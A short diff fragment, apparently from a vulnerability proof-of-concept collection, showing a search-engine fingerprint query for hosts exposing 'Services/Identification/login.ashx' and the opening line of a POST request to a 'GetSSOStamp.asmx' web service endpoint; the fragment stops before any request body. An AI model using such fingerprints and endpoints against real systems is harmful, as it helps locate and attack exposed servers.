@@ -8,7 +8,7 @@
 header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
 ```
 
-## poc
+## POC
 
 ```java
 POST /WebService/Lk6SyncService/DirectToOthers/GetSSOStamp.asmx HTTP/1.1
